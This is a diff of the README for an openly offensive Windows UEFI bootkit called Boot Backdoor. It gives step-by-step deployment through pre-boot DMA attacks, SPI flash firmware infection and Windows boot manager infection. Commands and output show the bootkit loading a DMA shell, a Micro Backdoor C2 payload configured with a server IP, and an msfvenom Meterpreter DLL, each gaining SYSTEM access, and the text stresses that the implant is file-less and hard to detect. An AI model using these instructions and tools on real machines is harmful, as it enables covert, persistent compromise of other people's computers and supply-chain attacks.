@@ -1,23 +1,23 @@
 
 # Boot Backdoor for Windows
 
-[General Information](#general-information)  
+[General information](#general-information)  
 [Contents](#contents)  
-[Deploying the Backdoor Using Pre-Boot DMA Attack](#deploying-the-backdoor-using-pre-boot-dma-attack)  
-[Deploying the Backdoor Using Firmware Flash Infection](#deploying-the-backdoor-using-firmware-flash-infection)  
-[Deploying the Backdoor Using Windows Boot Manager Infection](#deploying-the-backdoor-using-windows-boot-manager-infection)  
-[Using Boot Backdoor With DMA Shell Payload](#using-boot-backdoor-with-dma-shell-payload)  
-[Using Boot Backdoor With Micro Backdoor Payload](#using-boot-backdoor-with-micro-backdoor-payload)  
-[Using Boot Backdoor With Meterpreter Payload](#using-boot-backdoor-with-meterpreter-payload)  
+[Deploying the backdoor using pre-boot DMA Attack](#deploying-the-backdoor-using-pre-boot-dma-attack)  
+[Deploying the backdoor using firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection)  
+[Deploying the backdoor using Windows boot manager infection](#deploying-the-backdoor-using-windows-boot-manager-infection)  
+[Using boot backdoor with DMA Shell payload](#using-boot-backdoor-with-dma-shell-payload)  
+[Using boot backdoor with Micro Backdoor payload](#using-boot-backdoor-with-micro-backdoor-payload)  
+[Using boot backdoor with Meterpreter payload](#using-boot-backdoor-with-meterpreter-payload)  
 [Building From the Source Code](#building-from-the-source-code)    
 
-## General Information
+## General information
 
-This repository contains binaries and source code of Boot Backdoor &minus; malicious UEFI DXE driver that intended for executing of kernel mode and user mode payloads under the Windows operating system by having an arbitrary code execution at early boot stage during DXE phase of the platform firmware initialization. Backdoor is working by hijacking of Windows Loader `winload.efi` execution flow to inject [its driver](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/driver/driver.cpp) into the loading Windows kernel and then, having kernel mode code execution, the driver injects [user mode loader](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/loader/loader.cpp) into the legitimate `svchost.exe` process running under the local system. Unlike [LoJax](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/) or [Hacking Team UEFI rootkit](https://attack.mitre.org/software/S0047/) this backdoor resides only in memory without dropping of any files on the disk and without creating of any processes, this fact makes its detection way more difficult.
+This repository contains binaries and source code of Boot Backdoor &minus; UEFI DXE driver that intended for executing of kernel mode and user mode payloads under the Windows operating system by having an arbitrary code execution at early boot stage during DXE phase of the platform initialization. Backdoor is working by hijacking of Windows Loader `winload.efi` execution flow to inject [its driver](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/driver/driver.cpp) into the loading Windows kernel and then, having kernel mode code execution, the driver injects [user mode loader](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/loader/loader.cpp) into the legitimate `svchost.exe` process running under the local system. Unlike [LoJax](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/) or [Hacking Team UEFI rootkit](https://attack.mitre.org/software/S0047/) this backdoor resides only in memory without dropping of any files on the disk and without creating of any processes, this fact makes its detection way more difficult.
 
 The backdoor can be deployed in various of ways:
 
- * DMA attack over the PCI Express bus using [DMA attack toolkit](https://github.com/Cr4sh/s6_pcie_microblaze), also compatible with my other [Xilinx Zynq-7000 based design](https://github.com/Cr4sh/zc_pcie_dma) for DMA attacks. This method can be used with enabled UEFI Secure Boot.
+ * DMA attack over the PCI Express bus using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze), also compatible with my other [Xilinx Zynq-7000 based design](https://github.com/Cr4sh/zc_pcie_dma) for DMA attacks. This method can be used with enabled UEFI Secure Boot.
 
  * UEFI bootkit based on the infection of the platform firmware stored in [SPI flash chip on the motherboard](https://raw.githubusercontent.com/Cr4sh/blog/master/uefi-boot-script-expl/spi-flash-chips.jpg), which is suitable for supply chain attacks. This method can be used with enabled UEFI Secure Boot as well.
 
@@ -34,7 +34,7 @@ Here you can see some demo of Boot Backdoor + DMA Shell in action, [Xilinx ZC706
 
 ## Contents
 
-Boot backdoor code base contains the following files:
+Boot backdoor code base consists from the following files:
 
  * `src/BootBackdoor.c` &minus; UEFI DXE driver that hooks Windows Loader to hijack its boot flow and inject custom driver into the operating system kernel at early initialization stage. 
 
@@ -51,9 +51,9 @@ Boot backdoor code base contains the following files:
  * `infector.py` &minus; PE files infector used for deployment of Boot Backdoor with UEFI flash image infection and Windows boot manager image file infection.
 
 
-## Deploying the Backdoor Using Pre-Boot DMA Attack
+## Deploying the backdoor using pre-boot DMA attack
 
-Python program `uefi_backdoor_boot.py` injects UEFI DXE driver of Boot Backdoor located in `payloads/DmaBackdoorBoot` folder into the target system boot sequence using pre-boot DMA attack described in "Practical DMA Attacks" part of the [DMA attack toolkit documentation](https://github.com/Cr4sh/s6_pcie_microblaze#practical-dma-attacks). To use this program you have to perform the following steps:
+Python program `uefi_backdoor_boot.py` injects UEFI DXE driver of Boot Backdoor located in `payloads/DmaBackdoorBoot` folder into the target system boot sequence using pre-boot DMA attack described in "Practical DMA attacks" section of the [PCI Express DIY hacking toolkit documentation](https://github.com/Cr4sh/s6_pcie_microblaze#practical-dma-attacks). To use this program you have to perform the following steps:
 
  1) Power off the target computer.
 
@@ -102,7 +102,7 @@ Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0908
 [+] DONE
 ```
 
-You can use `--driver` option of `uefi_backdoor_boot.py` to specify an alternative UEFI DXE driver to inject, by default the program uses `payloads/DmaBackdoorBoot/DmaBackdoorBoot_X64.efi` driver. To specify Boot Backdoor payload you can use `--payload` option, its argument is a file path to the kernel driver or DLL image file.
+You can use `--driver` option of `uefi_backdoor_boot.py` to specify an alternative UEFI DXE driver to inject, by default the program uses `payloads/DmaBackdoorBoot/DmaBackdoorBoot_X64.efi` driver. To specify Boot Backdoor payload you can use `--payload` option, its argument is a file path to the kernel driver or DLL image.
 
 After the backdoor was loaded you can use `--debug-output` option to get debug messages of its UEFI DXE driver and print them into the stdout:
 
@@ -130,7 +130,7 @@ Winload.c(508) : winload!HvlpBelow1MbPageAllocated is at 0xa037b9
 Winload.c(587) : winload!OslArchTransferToKernel() is at 0x9c4b20
 ```
 
-Boot Backdoor kernel driver and user mode loader DLL are also printing various debug messages into the standard Windows debug output using `DbgPrint()` and `OutputDebugString()` functions. You can monitor this messages with kernel debugger or DbgView utility. Here's an example of such debug messages:
+Boot Backdoor kernel driver and user mode loader DLL are also printing various debug messages into the standard Windows debug output using `DbgPrint()` and `OutputDebugString()` functions. You can monitor this messages with [kernel debugger](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-kernel-mode-debugging-in-windbg--cdb--or-ntsd) or [DebugView utility](https://docs.microsoft.com/en-us/sysinternals/downloads/debugview). Here's an example of the debug messages:
 
 ```
 driver.cpp(761) : DriverEntryContinue(): Image address = 0xffffba81e5f03000
@@ -171,7 +171,7 @@ driver.cpp(435) : DeviceUnregisterThread(): Device successfully deleted
 ```
 
 
-## Deploying the Backdoor Using Firmware Flash Infection
+## Deploying the backdoor using firmware flash image infection
 
 To infect platform firmware stored in the flash chip on the motherboard you will need some SPI flash programmer, I prefer to use cheap and widely available [FT2232H Mini Module](https://www.ftdichip.com/Support/Documents/DataSheets/Modules/DS_FT2232H_Mini_Module.pdf) from FTDI. Also, there's a [board called Tigrad](https://www.crowdsupply.com/securinghw/tigard) &minus; multi-protocol, multi-voltage tool for hardware hacking that cat work as SPI flash programmer. In addition to the programmer you also will need the following tools:
 
@@ -181,7 +181,7 @@ To infect platform firmware stored in the flash chip on the motherboard you will
 
  * SOIC8 [test clip](https://www.sparkfun.com/products/13153) or [probe hook](https://www.sparkfun.com/products/9741) clips kit to connect programmer to the flash chip without its desoldering.
 
-First of all, you have to disassemble the machine and locate flash chip with platform firmware. Usually, it's [W25Q64](https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf) or [W25Q128](https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf) Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module. It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip. Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:
+First of all, you have to disassemble the machine and locate SPI flash chip with platform firmware. Usually, it's [W25Q64](https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf) or [W25Q128](https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf) Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module. It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip. Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:
 
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/spi_wiring.png" width="542" height="237">
 
@@ -201,7 +201,7 @@ For example, I picked `Bds.efi` DXE driver responsible for boot device selection
 > python infector.py --dxe-driver DmaBackdoorBoot_X64.efi --infect Bds.efi --output Bds_infected.efi
 ```
 
-To specify Boot Backdoor payload you can use `--payload` option of `infector.py`, its argument is a file path of the kernel driver or DLL image file.
+To specify Boot Backdoor payload you can use `--payload` option of `infector.py`, its argument is a file path of the kernel driver or DLL image.
 
 After that you have to replace original driver image with `Bds_infected.efi` one in UEFITool, save resulting firmware image and flash it back into the chip:
 
@@ -210,9 +210,9 @@ After that you have to replace original driver image with `Bds_infected.efi` one
 ```
 
 
-## Deploying the Backdoor Using Windows Boot Manager Infection
+## Deploying the backdoor using Windows boot manager infection
 
-Windows boot manager image file infection is preferable deployment method to use Boot Backdoor for the persistence when you don't have any specialized hardware or physical access to the target machine. Unlike previous methods this deployment method requires UEFI Secure Boot disabled.  
+Windows boot manager image file infection is preferable deployment method to use Boot Backdoor as persistence technique when you don't have any specialized hardware or physical access to the target machine. Unlike previous methods this deployment method requires UEFI Secure Boot disabled.  
 
 To infect Windows Boot Manager you have to perform the following steps.  
 
@@ -259,14 +259,14 @@ After that you can restart your system, disable Secure Boot in setup menu and bo
 
 Please pay attention that passing of `--patch-integrity-checks` command line option to the `infector.py` program is mandatory to disable self check of Windows Boot Manager image integrity, in other case it will not able to boot.  
 
-To specify Boot Backdoor payload you can use `--payload` option of `infector.py`, its argument is a file path of the kernel driver or DLL image file.
+To specify Boot Backdoor payload you can use `--payload` option of `infector.py`, its argument is a file path of the kernel driver or DLL image.
 
 
-## Using Boot Backdoor With DMA Shell Payload
+## Using boot backdoor with DMA Shell payload
 
-DMA Shell payload was designed to use it with Boot Backdoor specifically for pre-boot DMA attack cases. It allows to execute console commands over the rogue PCI-E device, transfer files and load arbitrary user mode or kernel mode code into the target operating system at the runtime.  
+DMA Shell payload was designed to work with Boot Backdoor specifically for pre-boot DMA attacks use cases. It allows to execute console commands over the rogue PCI-E device, transfer the files and load arbitrary user mode or kernel mode code into the target operating system at the runtime.  
 
-To use Boot Backdoor with DMA Shell there's a separate program `uefi_backdoor_boot_shell.py` that deploys appropriate payload located in `backdoor/dma_shell.dll` and allows to communicate with this payload from the attacker machine using shared memory channel accessible over the DMA. To use `uefi_backdoor_boot_shell.py` you have to perform the steps described in [Deploying the Backdoor Using Pre-Boot DMA Attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section. Here's an example of its deployment:
+To use Boot Backdoor with DMA Shell there's a separate program `uefi_backdoor_boot_shell.py` that deploys appropriate payload located in `backdoor/dma_shell.dll` and communicates with this payload from the attacker machine using [shared memory channel](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/dma_shell_user/transport.cpp) accessible over the DMA. To use `uefi_backdoor_boot_shell.py` you have to perform the same steps as described in [Deploying the backdoor using pre-boot DMA attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section. Here's an example of `uefi_backdoor_boot_shell.py` output during successful backdoor deployment:
 
 ```
 $ ./uefi_backdoor_boot_shell.py --command "whoami"
@@ -308,7 +308,7 @@ Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0908
 nt authority\system
 ```
 
-Now, when payload is deployed, you can run `uefi_backdoor_boot_shell.py` with `--attach` option to communicate with already running instance of DMA Shell:
+Now, when payload was loaded, you can run `uefi_backdoor_boot_shell.py` with `--attach` option to communicate with currently running instance of DMA Shell:
 
 ```
 $ ./uefi_backdoor_boot_shell.py --attach --command "dir C:\\"
@@ -368,14 +368,14 @@ $ ./uefi_backdoor_boot_shell.py --attach --load some_libray.dll
 [+] Image was successfully loaded
 ```
 
-Specified file will be loaded by DMA Shell payload in file-less way using reflective loader without dropping of any artifacts on the disk.
+Specified file will be loaded by DMA Shell in file-less way using reflective loader without dropping of any artifacts on the disk.
 
 
-## Using Boot Backdoor With Micro Backdoor Payload
+## Using boot backdoor with Micro Backdoor payload
 
-[Micro Backdoor](https://github.com/Cr4sh/MicroBackdoor) is a simple C2 tool with client and server, it provides basic features like commands execution and files transfer, it has convenient web interface and small footprint. It was designed to be minimalistic and easy customizable, I'm using it mainly as payload for demonstration of my firmware rootkits and various low level persistence techniques. It's more suitable to use Micro Backdoor payload while deploying Boot Backdoor with [Windows Boot Manager image file infection](#deploying-the-backdoor-using-windows-boot-manager-infection) (for persistence) or with [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-infection) (as part of the supply-chain attack), but in this example it will be shown how to use it for pre-boot DMA attacks just like in the example with DMA Shell.  
+[Micro Backdoor](https://github.com/Cr4sh/MicroBackdoor) is a simple C2 tool with client and server, it provides basic features like console commands execution and files transfer, it has convenient web interface and small footprint. It was designed to be minimalistic and easy customizable, I'm using it mostly for demonstration purposes as payload for my firmware rootkits and various low level persistence techniques. It's more suitable to use Micro Backdoor payload while deploying Boot Backdoor with [Windows boot manager image file infection](#deploying-the-backdoor-using-windows-boot-manager-infection) (for persistence) or with [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection) (as part of the supply chain attack), but in this example it will be shown how to use it for pre-boot DMA attacks just like in previous example with DMA Shell.  
 
-First of all, you need to generate RSA key pair used to secure communication between Micro Backdoor client and server:
+First of all, you need to generate RSA key pair used for secure communication between Micro Backdoor client and server:
 
 ```
 $ cd server
@@ -389,7 +389,9 @@ writing new private key to '/opt/MicroBackdoor/server/server.key'
 -----
 ```
 
-Then you have to edit `server/config.py` file with various server options (don't forget to change default login and password for accessing web interface) and can start it, you can use use `--daemon` command line option to run it in the background:
+Then you have to edit `server/config.py` file with various server options, don't forget to change default login and password for accessing its web interface.  
+
+Start the server, you also can use use `--daemon` command line option to run it in the background:
 
 ```
 $ ./server.py
@@ -402,7 +404,7 @@ $ ./server.py
 [01/May/2021:03:50:01] ENGINE Bus STARTED
 ```
 
-Now you need to write server configuration into the Micro Backdoor DLL image file using `payload_builder.py` program (where 10.211.55.2 is IP address of the host where server is running):
+Now you need to write server configuration into the Micro Backdoor DLL image file using `payload_builder.py` program (where `192.168.2.7` is IP address of the host where server is running):
 
 ```
 ./payload_builder.py payload_amd64_debug.dll 192.168.2.7
@@ -413,7 +415,7 @@ Using server certificate "/Users/d_olex/tc/_PoC/MicroBackdoor/server/server.crt"
 45568 bytes written into the "payload_amd64_debug.dll"
 ```
 
-Now you can use `uefi_backdoor_boot.py` program with Micro Backdoor payload in the same way as it was described in [Deploying the Backdoor Using Pre-Boot DMA Attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section:
+Now you can use `uefi_backdoor_boot.py` program with Micro Backdoor payload in the same way as it was described in [Deploying the backdoor using pre-Boot DMA attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section:
 
 ```
 $ ./uefi_backdoor_boot.py --payload payload_amd64_debug.dll
@@ -452,11 +454,11 @@ When operating system startup is complete Boot Backdoor will inject its payload 
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/micro_backdoor_web.png" width="827" height="420">
 
 
-## Using Boot Backdoor With Meterpreter Payload
+## Using boot backdoor with Meterpreter payload
 
-As it was mentioned above, you can use Boot Backdoor with any payload from the Metasploit framework, for example &minus; Meterpreter. Same as with Micro Backdoor, it's more suitable to use Meterpreter while deploying Boot Backdoor with [Windows Boot Manager image file infection](#deploying-the-backdoor-using-windows-boot-manager-infection) (for persistence) or with [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-infection) (as part of the supply-chain attack), but in this example it will be shown how to use it for pre-boot DMA attacks just like in previous example with DMA Shell.  
+As it was mentioned above, you can use Boot Backdoor with any payload from the Metasploit framework, for example &minus; Meterpreter. Same as with Micro Backdoor, it's more suitable to use Meterpreter while deploying Boot Backdoor with [Windows boot manager image file infection](#deploying-the-backdoor-using-windows-boot-manager-infection) (for persistence) or with [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection) (as part of the supply chain attack), but in this example it will be shown how to use it for pre-boot DMA attacks.  
 
-First of all, you need to generate Meterpreter payload as DLL image file using `msfvenom` command, in this example we will use its `bind_tcp` variation:
+First of all, you need to generate Meterpreter payload as DLL image file with `msfvenom` command, in this example we will use its `bind_tcp` variation:
 
 ```
 $ msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -a x64 -f dll -o meterpreter_bind_tcp_4444.dll
@@ -467,9 +469,9 @@ Final size of dll file: 8704 bytes
 Saved as: meterpreter_bind_tcp_4444.dll
 ```
 
-Please pay attention to the architecture of generated payload, it must match an architecture of the target system: i.e., Boot Backdoor can't run 32-bit x86 payloads on 64-bit x86_64 Windows versions.  
+Please pay attention to the payload architecture, it must match architecture of the target system: i.e., Boot Backdoor can't run 32-bit x86 payloads on 64-bit x86_64 Windows system.  
 
-Now you can use `uefi_backdoor_boot.py` program with Meterpreter payload in the same way as it was described in [Deploying the Backdoor Using Pre-Boot DMA Attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section:
+Now you can use `uefi_backdoor_boot.py` program with Meterpreter payload in the same way as it was described in [Deploying the backdoor using pre-Boot DMA attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section:
 
 ```
 $ ./uefi_backdoor_boot.py --payload meterpreter_bind_tcp_4444.dll
@@ -505,7 +507,7 @@ Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0908
 [+] DONE
 ```
 
-After the operating system startup is complete Boot Backdoor will load Meterpreter payload into the `svchost.exe` process running as local system. Now you can connect to the Meterpreter TCP port using `msfconsole` just as usual:
+When operating system startup is complete Boot Backdoor will inject Meterpreter payload into the `svchost.exe` process running as local system. Now you can connect to the Meterpreter TCP port from `msfconsole` just as usual:
 
 ```
 $ msfconsole
@@ -557,10 +559,10 @@ whoami
 nt authority\system
 ```
 
-**NOTE: Stock Meterpreter stager is easily detectable by most of the AV/EDR products, in case when it's not working on your test system for some reason &minus; check the antivirus logs, maybe it was just killed.**
+**NOTE: Stock Meterpreter stager is easily detectable by most of AV/EDR products, when it's not working on your test system for some reason &minus; check the antivirus logs, maybe it was just killed.**
 
 
-## Building From the Source Code
+## Building from the source code
 
 To build user mode and kernel mode components of the backdoor you need Python 2.7.x, Visual Studio 2013 or newer and [Windows Driver Kit 7.1.0](https://www.microsoft.com/en-sg/download/details.aspx?id=11800). Edit WDK folders path in `wdk_dirs.props` and `wdk_dirs_amd64.props` files and then just compile `backdoor.sln` solution in Visual Studio.
 
